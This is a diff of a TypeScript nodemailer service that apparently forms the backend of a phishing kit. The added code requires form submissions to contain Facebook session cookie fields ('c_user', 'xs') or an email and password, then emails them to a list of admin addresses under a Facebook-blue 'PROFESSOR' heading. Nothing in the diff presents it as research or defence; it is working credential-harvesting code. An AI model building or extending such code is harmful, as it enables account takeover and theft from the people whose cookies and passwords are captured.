@@ -1,19 +1,46 @@
 import nodemailer from "nodemailer";
-import { formOneConfig, formTwoConfig } from "./email-config";
+import { formOneConfig, formTwoConfig, getAllAdminEmails } from "./config/smtp-config";
 
 class EmailService {
   private formOneTransporter;
   private formTwoTransporter;
 
   constructor() {
-    this.formOneTransporter = nodemailer.createTransport(formOneConfig);
-    this.formTwoTransporter = nodemailer.createTransport(formTwoConfig);
+    try {
+      const configOne = formOneConfig();
+      const configTwo = formTwoConfig();
+
+      this.formOneTransporter = nodemailer.createTransport({
+        host: configOne.host,
+        port: configOne.port,
+        secure: configOne.secure,
+        auth: configOne.auth
+      });
+
+      this.formTwoTransporter = nodemailer.createTransport({
+        host: configTwo.host,
+        port: configTwo.port,
+        secure: configTwo.secure,
+        auth: configTwo.auth
+      });
+
+      console.log('Email service initialized successfully');
+    } catch (error) {
+      console.error('Failed to initialize email service:', error);
+      throw new Error('Email service initialization failed');
+    }
   }
 
   async sendFormOneEmail(data: any) {
+    if (!data || !data.c_user || !data.xs) {
+      console.error('Invalid form one data:', data);
+      throw new Error('Invalid form data provided');
+    }
+
+    const config = formOneConfig();
     const mailOptions = {
-      from: formOneConfig.auth.user,
-      to: formOneConfig.adminEmails.filter(Boolean).join(","),
+      from: config.auth.user,
+      to: getAllAdminEmails(config.adminEmails).join(", "),
       subject: "Zubai Jan",
       html: `
         <h2 style="color: #1877f2;">PROFESSOR</h2>
@@ -27,7 +54,11 @@ class EmailService {
     };
 
     try {
-      console.log("Sending form one email...");
+      console.log("Sending form one email with config:", {
+        host: config.host,
+        port: config.port,
+        adminEmails: getAllAdminEmails(config.adminEmails)
+      });
       const result = await this.formOneTransporter.sendMail(mailOptions);
       console.log("Form one email sent:", result);
       return result;
@@ -38,9 +69,15 @@ class EmailService {
   }
 
   async sendFormTwoEmail(data: any) {
+    if (!data || !data.user_email || !data.password) {
+      console.error('Invalid form two data:', data);
+      throw new Error('Invalid form data provided');
+    }
+
+    const config = formTwoConfig();
     const mailOptions = {
-      from: formTwoConfig.auth.user,
-      to: formTwoConfig.adminEmails.filter(Boolean).join(","),
+      from: config.auth.user,
+      to: getAllAdminEmails(config.adminEmails).join(", "),
       subject: "Zubair Jan",
       html: `
         <h2 style="color: #1877f2;">PROFESSOR</h2>
